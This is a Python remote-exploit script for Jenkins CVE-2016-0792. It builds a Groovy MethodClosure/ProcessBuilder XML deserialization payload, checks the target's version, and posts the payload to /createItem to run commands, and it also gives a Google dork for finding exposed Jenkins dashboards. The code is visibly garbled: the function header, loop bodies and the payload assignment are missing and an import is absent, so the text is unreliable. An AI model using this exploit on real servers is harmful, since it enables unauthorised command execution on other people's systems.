import string
from decimal import Decimal
 
import requests
from requests.exceptions import RequestException
 
# Exploit Title: Jenkins CVE-2016-0792 Deserialization Remote Exploit
# Google Dork: intitle: "Dashboard [Jenkins]" + "Manage Jenkins"
# Date: 30-07-2017
# Exploit Author: Janusz Piech√≥wka
# Github: https://github.com/jpiechowka/jenkins-cve-2016-0792
# Vendor Homepage: https://jenkins.io/
# Version: Versions before 1.650 and LTS before 1.642.2
# Tested on: Debian
# CVE : CVE-2016-0792
 
 
    splitCommand = command.split()
 
    for entry in splitCommand:
 
    xml = f&#039;&#039;&#039;
        <map>
          <entry>
            <groovy.util.Expando>
              <expandoProperties>
                <entry>
                  <string>hashCode</string>
                  <org.codehaus.groovy.runtime.MethodClosure>
                    <delegate class="groovy.util.Expando"/>
                    <owner class="java.lang.ProcessBuilder">
                    </owner>
                    <method>start</method>
                  </org.codehaus.groovy.runtime.MethodClosure>
                </entry>
              </expandoProperties>
            </groovy.util.Expando>
            <int>1</int>
          </entry>
        </map>&#039;&#039;&#039;
 
    return xml
 
 
def exploit(url, command):
    print(f&#039;[*] STARTING&#039;)
    try:
        print(f&#039;[+] Trying to exploit Jenkins running at address: {url}&#039;)
        # Perform initial URL check to see if server is online and returns correct response code using HEAD request
        headResponse = requests.head(url, timeout=30)
        if headResponse.status_code == requests.codes.ok:
            print(f&#039;[+] Server online and responding | RESPONSE: {headResponse.status_code}&#039;)
            jenkinsVersionHeader = headResponse.headers.get(&#039;X-Jenkins&#039;)
            if jenkinsVersionHeader is not None:
                # Strip version after second dot from header to perform conversion to Decimal
                stripCharacter = "."
                strippedVersion = stripCharacter.join(jenkinsVersionHeader.split(stripCharacter)[:2])
                # Perform basic version check
                if Decimal(strippedVersion) < 1.650:
                    print(f&#039;[+] Jenkins version: {Decimal(strippedVersion)} | VULNERABLE&#039;)
                    # Prepare payload
                    # Prepare POST url
                    randomJobName = &#039;&#039;.join(random.SystemRandom().choice(string.ascii_lowercase + string.digits) for _ in range(8))
                    if url.endswith(&#039;/&#039;):
                        postUrl = f&#039;{url}createItem?name={randomJobName}&#039;
                    else:
                        postUrl = f&#039;{url}/createItem?name={randomJobName}&#039;
                    print(f&#039;[+] Will POST to {postUrl}&#039;)
                    # Try to execute passed command
                    postResponse = requests.post(postUrl, data=payload, headers={&#039;Content-Type&#039;: &#039;application/xml&#039;})
                    print(f&#039;[+] Exploit launched &#039;)
                    # 500 response code is ok here
                    print(f&#039;[+] Response code: {postResponse.status_code} &#039;)
                    if postResponse.status_code == 500:
                        print(&#039;[+] SUCCESS&#039;)
                    else:
                        print(&#039;[-][ERROR] EXPLOIT LAUNCHED, BUT WRONG RESPONSE CODE RETURNED&#039;)
                else:
                    print(f&#039;[-][ERROR] Version {Decimal(strippedVersion)} is not vulnerable&#039;)
            else:
        else:
            print(f&#039;[-][ERROR] {url} Server did not return success response code | RESPONSE: {headResponse.status_code}&#039;)
    except RequestException as ex:
        print(f&#039;[-] [ERROR] Request exception: {ex}&#039;)
    print(&#039;[*] FINISHED&#039;)

